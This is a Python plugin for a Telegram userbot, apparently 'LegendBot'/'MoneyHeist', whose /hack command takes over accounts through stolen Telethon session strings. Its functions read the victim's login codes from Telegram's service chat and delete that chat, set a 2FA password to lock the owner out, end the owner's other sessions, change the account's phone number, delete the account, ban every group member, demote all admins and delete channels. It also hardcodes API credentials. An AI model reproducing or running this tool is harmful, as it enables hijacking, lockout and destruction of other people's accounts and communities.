# All credit goes to Professor-Money-Heist

import os

from telethon import events, functions, types

api_id = os.environ.get("APP_ID")
import asyncio
import os
from os import system

from telethon.tl.types import ChannelParticipantsAdmins

api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
from telethon import TelegramClient as tg
from telethon import functions
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
from telethon.tl.functions.channels import DeleteChannelRequest as dc
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc
from telethon.tl.functions.channels import JoinChannelRequest as join
from telethon.tl.functions.channels import LeaveChannelRequest as leave

from . import *

mybot = "missrose_bot"
from userbot import bot

legendboy = 2024465080


async def change_number_code(strses, number, code, otp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = X
        try:
            result = await bot(
                functions.account.ChangePhoneRequest(
                    phone_number=number, phone_code_hash=code, phone_code=otp
                )
            )
            return True
        except:
            return False


async def change_number(strses, number):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = X
        result = await bot(
            functions.account.SendChangePhoneCodeRequest(
                phone_number=number,
                settings=types.CodeSettings(
                    allow_flashcall=True, current_number=True, allow_app_hash=True
                ),
            )
        )
        return str(result)


async def userinfo(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return str(k)


async def terminate(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(rt())


GROUP_LIST = []


async def delacc(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(functions.account.DeleteAccountRequest("I am chutia"))


async def promote(strses, grp, user):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_admin(
                grp,
                user,
                manage_call=True,
                invite_users=True,
                ban_users=True,
                change_info=True,
                edit_messages=True,
                post_messages=True,
                add_admins=True,
                delete_messages=True,
            )
        except:
            await X.edit_admin(
                grp,
                user,
                is_admin=True,
                anonymous=False,
                pin_messages=True,
                title="Owner",
            )


async def user2fa(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_2fa("MONEY HEIST BOT IS TRENDING STYLISH ")
            return True
        except:
            return False


async def demall(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
            try:
                await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
            except:
                await X.edit_admin(
                    grp,
                    x.id,
                    manage_call=False,
                    invite_users=False,
                    ban_users=False,
                    change_info=False,
                    edit_messages=False,
                    post_messages=False,
                    add_admins=False,
                    delete_messages=False,
                )


async def joingroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(join(username))


async def leavegroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(leave(username))


async def delgroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(dc(username))


async def cu(strses):
    try:
        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
            k = await X.get_me()
            return [str(k.first_name), str(k.username or k.id)]
    except Exception:
        return False


async def usermsgs(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        i = ""
        async for x in X.iter_messages(777000, limit=3):
            i += f"\n{x.text}\n"
        await tgbot.delete_dialog(777000)
        return str(i)


async def userbans(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_participants(grp)
        for x in k:
            try:
                await X.edit_permissions(grp, x.id, view_messages=False)
            except:
                pass


async def userchannels(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X(pc())
        i = ""
        for x in k.chats:
            try:
                i += f"\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n"
            except:
                pass
        return str(i)


import logging

logging.basicConfig(level=logging.WARNING)

channel = "Prof_Agora"

menu = """
Reply To My Message If I am using In Group
"A" :~ [Check user own groups and channels]

"B" :~ [Check user all information like phone number, usrname... etc]

"C" :~ [Ban a group {give me StringSession and channel/group username i will ban all members there}]

"D" :~ [Know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]

"E" :~ [Join A Group/Channel via StringSession]

"F" :~ [Leave A Group/Channel via StringSession]

"G" :~ [Delete A Group/Channel]

"H" :~ [Check user two step is eneable or disable]

"I" :~ [Terminate All current active sessions except Your StringSession]

"J" :~ [Delete Account]

"K" :~ [Demote all admins in a group/channel]

"L" ~ [Promote a member in a group/channel]

"M" ~ [Change Phone number using StringSession]

I will add more features Later 😅
"""
mm = """
**I Am Giving U Full Power Of Mine.Now U Can Hack Anyone By String Session. Use /hack\n Only My Owner Can Acces This Command.If U want to Use Then Deploy LegendBot**
"""


@tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid))
async def start(event):
    global menu
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message(
            f"Send Option what you want with string session \n\n{menu}"
        )
        res = await x.get_response()
        r = res.text
        if res.text == "A":
            await x.send_message("📍GIVE STRING SESSION📍")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n /hack"
                )
            try:
                i = await userchannels(strses.text)
            except:
                return await event.reply(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            if len(i) > 3855:
                file = open("session.txt", "w")
                file.write(i + "\n\nDetails BY LegendBoy")
                file.close()
                await bot.send_file(event.chat_id, "session.txt")
                system("rm -rf session.txt")
            else:
                await event.reply(i + "\n\nThanks For using LegendBoyBot. \n/hack")
        elif res.text == "B":
            await x.send_message("🔱GIVE STRING SESSION🔱")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            i = await userinfo(strses.text)
            await event.reply(i + "\n\nThanks For using LegendBoy Bot.\n/hack")
        elif r == "C":
            await x.send_message("🔱GIVE STRING SESSION🔱")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond("⚜GIVE STRING SESSION⚜")
            await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
            grpid = await x.get_response()
            await userbans(strses.text, grpid.text)
            await event.reply("Banning all members. Thanks For using LegendBoy Bot")
        elif r == "D":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            i = await usermsgs(strses.text)
            await event.reply(i + "\n\nThanks For using MONEY-HEIST-BOT")
        elif r == "E":
            await x.send_message("⚡GIVE STRING SESSION⚡")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
            grpid = await x.get_response()
            await joingroup(strses.text, grpid.text)
            await event.reply(
                "Joined the Channel/Group Thanks For using MONEY-HEIST-BOT.\n/hack"
            )
        elif r == "F":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
            grpid = await x.get_response()
            await leavegroup(strses.text, grpid.text)
            await event.reply(
                "Leaved the Channel/Group Thanks For using MONEYHEIST Bot.\n/hack"
            )
        elif r == "G":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
            grpid = await x.get_response()
            await delgroup(strses.text, grpid.text)
            await event.reply(
                "Deleted the Channel/Group Thanks For using MONEYHEIST bot.\n/hack"
            )
        elif r == "H":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession is terminated maybe.\n/hack"
                )
            i = await user2fa(strses.text)
            if i:
                await event.reply(
                    "User don't have two step thats why now two step is `MoneyHeist Bot Is best` you can login now\n\nThanks For using MoneyHeist Bot.\n/hack"
                )
            else:
                await event.reply("Sorry User Have two step already")
        elif r == "I":
            await x.send_message("🏅GIVE STRING SESSION🏅")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            i = await terminate(strses.text)
            await event.reply(
                "The all sessions are terminated\n\nThanks For using MoneyHeist bot.\n/hack"
            )
        elif res.text == "J":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            i = await delacc(strses.text)
            await event.reply(
                "The Account is deleted SUCCESSFULLLY\n\nThanks For using MoneyHeist bot Bot."
            )
        elif res.text == "L":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
            grp = await x.get_response()
            await x.send_message("NOW GIVE USER USERNAME")
            user = await x.get_response()
            i = await promote(strses.text, grp.text, user.text)
            await event.reply(
                "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using MoneyHeist Bot.\n/hack"
            )
        elif res.text == "K":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession Has Been Terminated.\n/hack"
                )
            await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
            pro = await x.get_response()
            try:
                i = await demall(strses.text, pro.text)
            except:
                pass
            await event.reply(
                "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using MoneyHeist Bot.\n/hack"
            )
        elif res.text == "M":
            await x.send_message("GIVE STRING SESSION")
            strses = await x.get_response()
            op = await cu(strses.text)
            if op:
                pass
            else:
                return await event.respond(
                    "This StringSession is terminated maybe\n/hack"
                )
            await x.send_message(
                "GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] "
            )
            number = (await x.get_response()).text
            try:
                result = await change_number(strses.text, number)
                await event.respond(
                    result
                    + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp"
                )
                await asyncio.sleep(20)
                await x.send_message("NOW GIVE PHONE CODE HASH")
                phone_code_hash = (await x.get_response()).text
                await x.send_message("NOW GIVE THE OTP")
                otp = (await x.get_response()).text
                changing = await change_number_code(
                    strses.text, number, phone_code_hash, otp
                )
                if changing:
                    await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
                else:
                    await event.respond("Something is wrong")
            except Exception as e:
                await event.respond(
                    "SEND THIS ERROR TO - @MM_USERBOT\n**LOGS**\n" + str(e)
                )

        else:
            await event.respond("Wrong Text Found Re type /hack and use")
